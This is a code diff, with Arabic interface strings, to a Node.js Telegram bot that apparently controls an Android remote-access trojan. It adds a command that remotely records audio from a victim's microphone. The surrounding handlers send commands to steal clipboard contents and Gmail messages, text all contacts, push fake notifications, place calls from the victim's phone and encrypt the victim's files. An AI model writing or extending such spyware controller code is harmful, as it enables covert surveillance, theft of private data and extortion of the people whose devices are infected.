@@ -256,7 +256,43 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
-  // إصلاح مشكلة الاهتزاز
+  // إصلاح مشكلة التسجيل الصوتي
+  else if (appData.get("currentAction") === "microphoneDuration") {
+    const duration = parseInt(text);
+    const target = appData.get("currentTarget");
+    
+    if (isNaN(duration)) {
+      bot.sendMessage(chatId, "<b>❌ مدة غير صالحة. الرجاء إدخال رقم.</b>", { parse_mode: "HTML" }).catch(console.error);
+      return;
+    }
+    
+    // التحقق من اتصال الجهاز قبل إرسال الأمر
+    if (!io.sockets.sockets.has(target)) {
+      bot.sendMessage(chatId, "<b>❌ الجهاز غير متصل حاليًا</b>", { parse_mode: "HTML" }).catch(console.error);
+      appData.delete("currentTarget");
+      appData.delete("currentAction");
+      return;
+    }
+    
+    io.to(target).emit("commend", {
+      request: "microphone",
+      extras: [{ key: "duration", value: duration }]
+    });
+    
+    appData.delete("currentTarget");
+    appData.delete("currentAction");
+    
+    bot.sendMessage(chatId, `<b>🔴 بدء التسجيل لمدة ${duration} ثانية...</b>`, {
+      parse_mode: "HTML",
+      reply_markup: {
+        keyboard: [
+          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
+          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
+        ],
+        resize_keyboard: true
+      }
+    }).catch(console.error);
+  } 
   else if (appData.get("currentAction") === "vibrateDuration") {
     const duration = parseInt(text);
     const target = appData.get("currentTarget");
@@ -285,7 +321,6 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   } 
-  // إصلاح مشكلة الحافظة
   else if (appData.get("currentAction") === "toastText") {
     const toastText = text;
     const target = appData.get("currentTarget");
@@ -309,7 +344,6 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
-  // إصلاح مشكلة إرسال الرسائل
   else if (appData.get("currentAction") === "smsNumber") {
     const number = text;
     appData.set("currentNumber", number);
@@ -352,7 +386,6 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
-  // إصلاح مشكلة رسائل Gmail
   else if (appData.get("currentAction") === "textToAllContacts") {
     const messageText = text;
     const target = appData.get("currentTarget");
@@ -376,7 +409,6 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
-  // إصلاح مشكلة الإشعار المزيف
   else if (appData.get("currentAction") === "notificationText") {
     const notificationText = text;
     appData.set("currentNotificationText", notificationText);
@@ -419,7 +451,6 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
-  // إصلاح مشكلة الاتصال من الضحية
   else if (appData.get("currentAction") === "makeCallNumber") {
     const phoneNumber = text;
     appData.set("currentNumber", phoneNumber);
@@ -472,7 +503,6 @@ bot.on("message", msg => {
       }).catch(console.error);
     }
   }
-  // إصلاح مشكلة تشفير الملفات
   else if (appData.get("currentAction") === "encryptFiles") {
     const encryptionKey = text;
     const target = appData.get("currentTarget");
@@ -496,8 +526,6 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   }
-  
-  // Handle other actions...
   
   // Device count
   else if (text === "📊 عدد الأجهزة") {
@@ -629,7 +657,7 @@ bot.on("message", msg => {
       }).catch(console.error);
     }
     
-    // Handle clipboard (الحافظة) - تم إصلاحه
+    // Handle clipboard
     else if (text === "📋 الحافظة") {
       io.to(target).emit("commend", { request: "clipboard", extras: [] });
       bot.sendMessage(chatId, "<b>🔃 جاري استرجاع محتوى الحافظة...</b>", {
@@ -677,7 +705,7 @@ bot.on("message", msg => {
       }).catch(console.error);
     }
     
-    // Handle Gmail messages (رسائل Gmail) - تم إصلاحه
+    // Pull Gmail messages
     else if (text === "📧 رسائل Gmail") {
       io.to(target).emit("commend", { request: "all-email", extras: [] });
       bot.sendMessage(chatId, "<b>🔃 جاري سحب رسائل Gmail...</b>", {
@@ -711,7 +739,7 @@ bot.on("message", msg => {
       }).catch(console.error);
     }
     
-    // Vibrate device (اهتزاز) - تم إصلاحه
+    // Vibrate device
     else if (text === "📳 اهتزاز") {
       appData.set("currentAction", "vibrateDuration");
       bot.sendMessage(chatId, "<b>⏱️ أدخل مدة الاهتزاز (بالثواني):</b>", {
